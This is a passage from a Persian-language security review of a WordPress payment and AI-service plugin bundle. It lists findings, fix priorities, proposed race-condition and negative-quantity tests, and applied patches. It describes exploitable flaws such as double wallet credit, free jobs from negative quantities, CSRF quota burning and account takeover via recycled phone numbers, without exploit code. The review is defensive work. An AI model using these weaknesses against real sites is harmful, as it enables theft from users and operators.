| M8 | `Quota::record()` بعد از شارژ صدا زده می‌شود ولی در بازپرداخت (nonce ناموفق) برگردانده نمی‌شود → CSRF می‌تواند سهمیهٔ روزانهٔ کاربر را بسوزاند | `class-ajax-billing.php:212` |
| M9 | `Capability_Bridge::grant_primitive()` کپابیلیتی را برای **کل درخواست** می‌دهد، نه برای یک فراخوانی. با `doing_action()` محدودش کن تا سطح حمله کوچک‌تر شود | `class-capability-bridge.php:87` |
| M10 | `Mobile_Auth::find_user()` به username قطعی (`Phone::to_username`) برمی‌گردد. با بازیافت شمارهٔ موبایل توسط اپراتور، مالک جدید سیم‌کارت به کیف پول مالک قبلی دسترسی پیدا می‌کند. حداقل `META_VERIFIED_AT` قدیمی را بررسی و حساب را برای تأیید مجدد معلق کن | `class-mobile-auth.php:65` |
| M11 | `version_compare( ETEHADYAR_CORE_VERSION, '1.8.0-phase9', '>=' )` — پسوند `-phase9` در `version_compare` **بزرگ‌تر** از `1.8.0` خالی مقایسه می‌شود. اگر روزی هسته را `1.9.0` بدون پسوند منتشر کنی درست است، ولی `1.8.0` خالی باعث می‌شود قالب بگوید «هسته قدیمی است». نسخه را semver خالص کن و فاز را در ثابت جدا نگه دار | `class-core-dependency.php:53` |
| M12 | `Tested up to: 6.9` در `etehadyar/readme.txt` در برابر `7.1` در هسته و قالب. گزارش M4 («هدر کهنه») فقط روی هسته اعمال شده | `etehadyar/readme.txt:5` |
| M13 | `Domain Path: /languages` و `load_plugin_textdomain()` در هر دو پلاگین، ولی **هیچ پوشهٔ `languages/` و هیچ فایل `.pot` وجود ندارد**. یا حذفش کن یا فایل ترجمه بساز | هر دو bootstrap |
| M14 | `index.php` («سکوت طلایی») فقط در قالب هست، نه در دو پلاگین → در صورت فعال بودن directory listing، ساختار `includes/` عمومی است | هر دو پلاگین |

---

## ۶) بسته‌بندی و خودِ مخزن گیت‌هاب

این بخش مستقل از کیفیت کد است و برای یک پروژهٔ تجاری مهم:

1. **مخزن فقط یک فایل باینری دارد.** `git ls-files` → `EtehadYar.zip`. یعنی: بدون تاریخچهٔ کد، بدون diff، بدون blame، بدون CI، بدون issue template، بدون LICENSE در ریشه، بدون README در ریشه، بدون `.gitignore`. هیچ‌کس نمی‌تواند تغییرات را بازبینی کند یا PR بدهد. برای پروژه‌ای که پول مردم را جابه‌جا می‌کند این بزرگ‌ترین ریسک فرآیندی است.
   **رفع:** `بسته-نصب/etehadyar-core/` و بقیه را به‌عنوان درخت واقعی کامیت کن؛ zip را در GitHub Releases بگذار، نه در مخزن.
2. **نام‌های فارسی داخل zip ناسازگارند.** zip برای هر ورودی، نام ASCII رمزگونه (`qbsv-udq/`) را در فیلد اصلی و نام واقعی UTF-8 را در extra field `0x7075` گذاشته است. `unzip` روی لینوکس نام‌ها را به‌صورت `#U0628#U0633#U062a#U0647-…` چاپ می‌کند و پایتون/ابزارهای دیگر نام رمزگونه را می‌بینند. یعنی بسته روی سیستم‌های مختلف به شکل‌های مختلف باز می‌شود.
   **رفع:** نام پوشه‌های داخل zip را ASCII کن (`install-package/`, `reports/`, `preview/`)؛ فارسی را در متن README نگه دار.
3. **`بسته-نصب/` باید سه zip باشد** (طبق README)، ولی سه پوشه است. افزونه را باید با پوشهٔ پلاگین در ریشهٔ zip بسته‌بندی کرد: `etehadyar-core/etehadyar-core.php`, …
4. **۷۵۱ assertion ادعا شده، ولی یک فایل تست هم در بسته نیست.** «همهٔ تست‌ها روی شبیه‌ساز وردپرس با SQLite اجرا شده‌اند» — و خود README می‌پذیرد که «تفاوت‌های جزئی MySQL و SQLite تنها ریسک باقی‌مانده است». در حالی که **C2 (race در کردیت) دقیقاً از همان دسته است**: `INSERT IGNORE`، `UNIQUE KEY`، رفتار `UPDATE … WHERE balance >= n` و قفل ردیف در SQLite و MySQL یکسان نیستند. تست‌ها را (دست‌کم برای `Wallet`، `Orders::handle_return`، `OTP_Service` و `Ajax_Billing`) داخل مخزن بگذار تا قابل اجرا و بازبینی باشند.
5. **`README-DEV.md`، `SECURITY.md`، `QUEUE.md` و `CHANGELOG-6.0.md` داخل پوشهٔ پلاگین‌اند** → بعد از نصب عمومی خوانده می‌شوند: `/wp-content/plugins/etehadyar/README-DEV.md`. این‌ها سند داخلی‌اند؛ از build حذفشان کن.
6. **ناسازگاری شمارهٔ نسخه در خود پلاگین قدیمی:** هدر `Version: 6.13.2`، توضیحات `اتحادیار 6.8.3`، `EAIW_DB_VERSION = '6130'` (= 6.13.0)، نام فایل `etehadwp-ai-writer.php`، text domain `etehadwp-ai-writer` در برابر `etehadyar`. یکی کن.

---

## ۷) آنچه واقعاً خوب است (و باید حفظ شود)

انتقاد بدون ذکر نقاط قوت، تصویر درستی نمی‌دهد. این‌ها را دیدم و تأیید می‌کنم:

- **`Tenant_Repository`** جداسازی داده را ساختاری کرده: `user_id = %d` در کلاس پایه assembled می‌شود، `normalise_filters()` نام ستون را با regex **و** `Schema::has_column()` اعتبارسنجی می‌کند، و `find()` مالکیت را در WHERE می‌گذارد نه بعد از واکشی. این درست‌ترین راه حل چندمستأجری کردن یک پلاگین تک‌کاربره است.
- **`Studio_Controller::job()`** — مالکیت بخشی از کوئری است؛ کامنتش هم دقیقاً دلیلش را می‌گوید.
- **`OTP_Service`** — کد ۵ رقمی با `random_int`، هش SHA-256 با salt هر شماره، `hash_equals`، سه لایهٔ محدودیت (شماره/ساعت، IP/ساعت، تلاش بر هر challenge)، باطل‌کردن challenge قبلی، سوزاندن کد وقتی SMS نرسیده، ماسک کردن شماره در لاگ، و پیام عمومی خنثی در برابر خطای پنل. این یک پیاده‌سازی درست است.
- **`Zarinpal_Gateway`** — مبلغ همیشه از رکورد خودی خوانده می‌شود نه از callback؛ `code 101` به‌درستی موفقیت تلقی می‌شود؛ `hash_equals` روی authority؛ جدول کامل کدهای خطا به فارسی.
- **`Rate_Limiter::client_ip()`** و `OTP_Service::client_ip()` — هدرهای پروکسی را به‌صورت پیش‌فرض **باور نمی‌کنند** و دلیلش را نوشته‌اند. این همان جایی است که اکثر پلاگین‌ها اشتباه می‌کنند.
- **`Wallet::charge()`** — شرط کفایت موجودی داخل `WHERE` خود UPDATE؛ واقعاً اتمی است.
- **`Ajax_Billing`** — ایدهٔ «اول کسر، بعد اجرا، بعد تطبیق» درست است؛ `is_degraded()` که placeholder را به‌جای موفقیت واقعیrefund می‌کند نشانهٔ دقت است؛ و «پاسخ غیرقابل‌پارس = شکست = بازپرداخت» جهت درست اشتباه‌کردن را انتخاب کرده.
- **`Auth_Controller::origin_is_allowed()`** — درخواست بدون Origin/Referer را به‌صورت پیش‌فرض رد می‌کند و opt-in گذاشته.
- **`Migrator`** هسته — registry شماره‌دار، صعودی، هر نسخه جداگانه ثبت، قفل با `finally`. الگویی که باید به پلاگین قدیمی هم برسد.
- **صداقت گزارش‌ها** — رد کردن C5 به‌عنوان «هشدار کاذب» و نوشتن تست نگهبان به‌جای کد بی‌اثر، و اعتراف صریح به ساختگی‌بودن آمار داشبورد. این فرهنگ را می‌شود در کد دید (کامنت‌ها «چرا» را می‌گویند).
- **تفکیک سه‌بسته‌ای** (هسته/موتور/قالب) تصمیم درستی است و دلیلش در README خوب توضیح داده شده.

مشکل، ضعف طراحی نیست؛ **ناهمگنی دو نسل کد است** که در یک بسته به هم دوخته شده‌اند.

---

## ۸) ترتیب پیشنهادی کار

### همین حالا (قبل از هر نصب روی سایت واقعی)

1. **C1** — allowlist پسوند در `class-video-studio-pro.php:26` + بیرون آوردن `eaiw_video_build` از `PRIMITIVE_MAP`.
2. **C3** — `max(1, …)` روی quantity و تبدیل `cost <= 0` به رد درخواست.
3. **C2** — INSERT-اول در `Wallet::credit()`/`charge()` یا claim اتمی سفارش.
4. **H4** — جابه‌جایی یک آکولاد در activator.

### قبل از راه‌اندازی عمومی

5. **H1** — دو hook در worker + `run_as()` + بازپرداخت کار صف‌شدهٔ ناموفق.
6. **H2** — `wp_kses_post()` در `clean_html()` + اصلاح رندر سمت کلاینت.
7. **H3** — انتقال مهاجرت‌های قدیمی به الگوی `Migrator`.
8. **H5** — یکسان‌سازی UTC + تبدیل در نمایش.
9. بخش ۴ — `Requires Plugins` و قفل‌کردن صریح وابستگی دو افزونه.
10. **H6/H7** — جابه‌جایی کلیدها به هدر و هشدار پروکسی تلگرام.

### بعد از آن

11. H8–H10 و M1–M14.
12. بخش ۶ — کد به جای zip در مخزن، تست‌ها در مخزن، zipها در Releases، CI (phpcs + PHPStan + PHPUnit روی MySQL واقعی).

### دو تستی که حتماً اضافه شوند

```
test_concurrent_return_credits_once
    → دو فراخوانی همزمان handle_return() با یک Authority
    → assert: balance == amount، ledger rows == 1، orders.status == paid

test_negative_length_is_rejected
    → $_POST['length'] = -1، background = 1
    → assert: پاسخ خطا است، jobs خالی است، Wallet::charge صدا زده شده
```

این دو تست به‌تنهایی هر سه یافتهٔ بحرانی این گزارش را قفل می‌کنند.

---

## ۹) پچ‌های اعمال‌شده در این شاخه

منبع از داخل `EtehadYar.zip` به خودِ مخزن استخراج شد (۱۶۱ فایل، نام‌های فارسی دست‌نخورده) تا تغییرات قابل diff و blame باشند. سه یافتهٔ بحرانی به‌علاوهٔ H4 و M6 روی شاخهٔ `arena/4cb41f74-etehadyar` اصلاح شده‌اند. همهٔ مسیرها نسبت به `بسته-نصب/` هستند.

| # | فایل | تغییر |
|---|------|-------|
| C1 | `etehadyar/includes/Video/class-video-studio-pro.php` | پسوند فایل دیگر از URL کاربر گرفته نمی‌شود؛ متد خصوصی `image_ext()` با allowlist (`jpg/jpeg/png/webp/gif`، پیش‌فرض `jpg`) جایگزین `pathinfo(parse_url(…))` شد. `wp_http_validate_url()` پیش از هر `download_url()` برای تصاویر و صدا. نام فایل صوتی ثابت (`voice.mp3`) شد. |
| M6 | همان فایل | `ffmpeg_available()` حالا `function_exists('exec')` و `disable_functions` را هم می‌سنجد؛ پیش‌تر با `exec` غیرفعال، `@exec` بی‌صدا رد می‌شد و تابع به‌اشتباه `true` می‌داد. |
| C1 | `etehadyar-core/includes/Compat/class-capability-bridge.php` | فیلتر جدید `etehadyar_grant_primitive` با چهار آرگومان (`$grant, $primitive, $action, $user_id`) تا مالک سایت بتواند `eaiw_video_build` (که در uploads فایل می‌نویسد) را فقط به کارکنان بدهد، بدون fork کردن bridge. |
| C3 | `etehadyar-core/includes/Billing/class-ajax-billing.php` | `$quantity <= 0` دیگر «کار رایگان» نیست: پاسخ `400` با کد `etehadyar_billing_invalid_quantity` + رویداد `billing.rejected_invalid_quantity` در Audit. مسیر `cost <= 0 → return` عمداً حفظ شد (لایهٔ رایگان مدیران). رگرسیونی ندارد: `video_units(0)` کمینهٔ ۱ را برمی‌گرداند و برآوردگرهای تصویر همیشه ۱ هستند. |
| C2 | `etehadyar-core/includes/Billing/class-wallet.php` | `record()` حالا `$inserted` را می‌سنجد و در شکست کلید یکتا `array()` برمی‌گرداند. متد `reverse_balance()` اضافه شد؛ `credit()` و `charge()` در این حالت حرکت موجودی خود را واژگونه می‌کنند، Audit می‌نویسند (`wallet.duplicate_credit_reversed` / `wallet.duplicate_charge_reversed`) و برندهٔ واقعی یا `WP_Error` برمی‌گردانند. ledger همچنان append-only است. |
| C2 | `etehadyar-core/includes/Billing/class-orders.php` | وضعیت جدید `STATUS_SETTLING`. `handle_return()` **پیش از** تماس شبکه‌ای (که تا ۳۰ ثانیه طول می‌کشد) ردیف را با `claim_pending()` — یک `UPDATE … WHERE id=%d AND status='pending'` با شرط `affected == 1` — تصاحب می‌کند؛ بازنده‌ها `billing.return_race_blocked` می‌گیرند و بسته به وضعیت، `etehadyar_order_closed` (ناموفق/لغو) یا `etehadyar_payment_in_progress` (۴۰۹) برمی‌گردانند. `release_claim()` اضافه شد و در شکست کردیت صدا زده می‌شود (`billing.credit_failed`) تا سفارش در `settling` گیر نکند. `status_label()` برچسب فارسی گرفت. `status varchar(20)` است، پس بدون تغییر schema جا می‌شود. |
| C2 | همان فایل — ادعای رهاشده | `CLAIM_TTL` (۱۲۰ ثانیه) و کلید `etehadyar_order_claim_{id}`: ترانسینت **پیش از** تماس با درگاه نوشته می‌شود و در هر سه مسیر پایانی پاک می‌شود. اگر ادعا شکست بخورد و وضعیت `settling` باشد و ترانسینت منقضی شده باشد، یعنی ریکوئست صاحب ادعا مرده (خطای fatal، تایم‌اوت PHP، دیپلوی)؛ در این حالت `release_claim()` و یک تلاش دوباره انجام می‌شود (`billing.stale_claim_reclaimed`). ترانسینت فقط «نشانهٔ زنده بودن» است — داور نهایی همان `UPDATE` شرطی است، پس دو ریکوئست همزمان نمی‌توانند هر دو برنده شوند. |
| C2 | همان فایل — `expire_stale()` | **عمداً ادعاهای رهاشده را جارو نمی‌کند**، فقط با `billing.stranded_claims` (severity=error) گزارششان می‌دهد. نسخهٔ اول پچ من این را به `pending` برمی‌گرداند که بدتر از باگ اصلی بود: جاروی `pending → cancelled` در همان فراخوانی و بلافاصله بعد اجرا می‌شود، پس سفارشِ پول‌داده‌شده «لغو شده» ثبت می‌شد. انقضا حالا فقط سراغ سفارش‌هایی می‌رود که هرگز ادعا نشده‌اند. |
| C2 | `etehadyar-core/includes/Frontend/class-payment-handler.php` + `class-wallet-shortcode.php` | حالت سوم `payment=processing` با پیام «در حال پردازش است… از پرداخت مجدد خودداری کنید». گفتن «ناموفق» به بازندهٔ race دروغ بود و مشتری را به پرداخت دوباره وامی‌داشت. `reason` همچنان `esc_html` می‌شود (XSS ندارد). |
| H4 | `etehadyar/includes/Core/class-activator.php` | آکولاد جابه‌جا شد: `minutely` دیگر داخل شرط `fifteen_minutes` ثبت نمی‌شود. شدت این مورد پس از بررسی دقیق‌تر از «مهم» به «متوسط» کاهش یافت، چون `EAIW_Plugin::init()` (خطوط ۷۸–۸۲) هم فیلتر درست را ثبت می‌کند و هم رویدادها را در هر ریکوئست دوباره زمان‌بندی می‌کند. |
| — | `.gitignore` | فایل تازه: ابزارهای توسعه، لاگ‌ها و بسته‌های ساخته‌شده نادیده گرفته می‌شوند (`EtehadYar.zip` استثنا شد). |

**اعتبارسنجی:** در این محیط باینری PHP وجود ندارد (`php -l`، PHPStan و PHPCS قابل اجرا نیستند و نصب هم به root نیاز دارد)، پس صحت با خواندن دقیق و یک بررسی توازن آکولاد/پرانتز روی هر ۸ فایل تأیید شد. **این جای تست واقعی را نمی‌گیرد** — پیش از استقرار، دو تست انتهای بخش ۸ را روی MySQL واقعی اجرا کنید.

| H1 | `etehadyar/includes/Core/class-job-queue.php` | دو درز تازه برای پلاگین همراه: فیلتر `eaiw_job_executor` (کل `switch` به‌صورت یک callable بیرون داده می‌شود تا بتوان اجرای کار را پوشاند) و هوک‌های `eaiw_job_before` / `eaiw_job_result`. `recover_stale()` هم برای کارهایی که برای همیشه شکست می‌خورند `eaiw_job_result` را شلیک می‌کند، چون آن‌ها هرگز به هوک `run_next()` نمی‌رسند. `enqueue()` کاربر درخواست‌کننده را ثبت می‌کند، با یک کاوش `SHOW COLUMNS` کش‌شده — ستون `user_id` را `Migrator` هسته اضافه می‌کند و در نصب مستقل وجود ندارد، پس نوشتنش بدون این نگهبان هر enqueue را می‌شکست. |
| H1 | `etehadyar-core/includes/Billing/class-job-settlement.php` (فایل تازه) | `wrap_executor()` کار را داخل `Legacy_Bridge::run_as()` اجرا می‌کند — همان متد مرده‌ای که گزارش پیدا کرده بود — و از راه `Tenant_Context::as_tenant()` هویت قبلی را در بلوک `finally` برمی‌گرداند. پوشاندن بهتر از دو هوک جفت‌شده است: کاری که exception می‌دهد نمی‌تواند هویت کار بعدی را نشت بدهد. `on_result()` کارِ برای‌همیشه‌شکست‌خورده را با کلید idempotency `job:{id}:refund` بازپرداخت می‌کند، پس گزارش دوبارهٔ همان کار از دو مسیر نمی‌تواند دوبار پول برگرداند. رزروها **یک ردیف option به ازای هر کار** هستند (autoload=no) نه یک آرایهٔ مشترک: آرایهٔ مشترک خواندن-تغییر-نوشتن می‌خواهد و دو worker همزمان می‌توانستند یک نوشتن را گم کنند — یعنی دقیقاً همان جهتی که بازپرداخت مشتری را از بین می‌برد. `prune()` روی همان هوک نگهداری روزانه اجرا می‌شود. |
| H1 | `etehadyar-core/includes/Billing/class-ajax-billing.php` | شاخهٔ `queued` در `reconcile()` حالا واقعاً کار را به `Job_Settlement::reserve()` تحویل می‌دهد. آن کامنت («کارگر موقع اجرا صورتحساب می‌کند») پیش‌تر وعده‌ای بود که هیچ کدی پایش نمی‌ایستاد. هندلری که `queued` می‌گوید ولی `job_id` نمی‌دهد هرگز قابل تسویه نیست، پس همان لحظه بازپرداخت و Audit می‌شود. |
| §۴ | `etehadyar/includes/Core/class-plugin.php` | Endpoint عمومی `/eaiw/v1/support/audio` (۸ مگابایت بارگذاری ناشناس → رونویسی پولی Whisper) در نصب مستقل هیچ محدودساز نرخی نداشت. حالا داخل خود callback به ۳ درخواست در ساعت محدود می‌شود (کلید: شناسهٔ کاربر یا هش IP)، با همان الگویی که `EAIW_ChatSoul::rest_chat()` در همین کدبیس دارد. وقتی `ETEHADYAR_CORE_VERSION` تعریف شده باشد واگذار می‌کند به `Endpoint_Guard`، تا یک درخواست در دو سطل شمارش نشود و سهمیهٔ واقعی نصف نشود. |
| §۴ | `etehadyar/readme.txt` | بخش «رابطه با افزونهٔ هسته» اضافه شد: هسته چه چیزی اضافه می‌کند و بدون آن چه چیزی غایب است، تا نصب مستقل یک انتخاب آگاهانه باشد. **قفل سخت وابستگی (`Requires Plugins`) عمداً اعمال نشد** — شکاف را می‌بست، ولی همان حالت نصبی را می‌شکست که سند تحویل وعده می‌دهد، و غیرفعال‌شدن هسته همهٔ قابلیت‌های AI سایت را با خودش پایین می‌آورد. |
| M12 | `etehadyar/readme.txt` | `Tested up to: 6.9` → `7.1` (هسته و پوسته هر دو ۷.۱ می‌گفتند). |

**هنوز اصلاح‌نشده:** H2، H3، H5، H6–H10 و همهٔ M1–M5 و M7–M14 (به‌جز M6 و M12).

نکتهٔ باقی‌مانده دربارهٔ §۴: شکاف معماری سر جایش است — محافظت‌ها در هسته زندگی می‌کنند و کد آسیب‌پذیر در پلاگین قدیمی. آنچه درست شد این است که پرخرج‌ترین نقطهٔ تماس عمومی حالا در هر دو حالت محافظت‌شده است. راه‌حل کامل‌تر، انتقال خودِ محافظت‌ها به کنار کدی است که محافظت می‌شود.

---

*پایان بررسی. همهٔ ارجاع‌های خطی نسبت به درخت باز‌شدهٔ `بسته-نصب/` در همین مخزن هستند.*
